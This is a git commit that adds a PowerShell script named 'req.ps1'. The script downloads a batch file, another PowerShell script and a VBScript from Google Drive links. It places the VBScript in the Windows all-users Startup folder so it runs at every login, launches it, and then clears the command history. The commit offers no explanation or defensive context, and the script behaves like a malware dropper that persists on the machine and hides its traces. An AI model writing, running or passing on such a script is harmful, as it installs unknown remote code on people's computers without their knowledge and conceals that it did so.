79b62738f856ba4b29cd99e40728fd9feadc23bc
UNKNOWNHUNTER6969 <98267862+UNKNOWNHUNTER6969@users.noreply.github.com>
2025-07-02 20:32:22 -0700

    Add files via upload

---
+++ req.ps1
@@ -0,0 +1,8 @@
+cd C:\Users\$Env:UserName
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1FvnhxznvSAdg432ZJv2Scw9dXKO6a6oc" -outfile "win64.bat"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1sTl08ZS1LBg_8_k9MP2IkvFka70HABeO" -outfile "user.ps1"
+cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1Xb04koBk_3V7TowsMP3kaqgpBAWJZz5x" -outfile "startup.vbs"
+start startup.vbs
+Clear-History
+exit
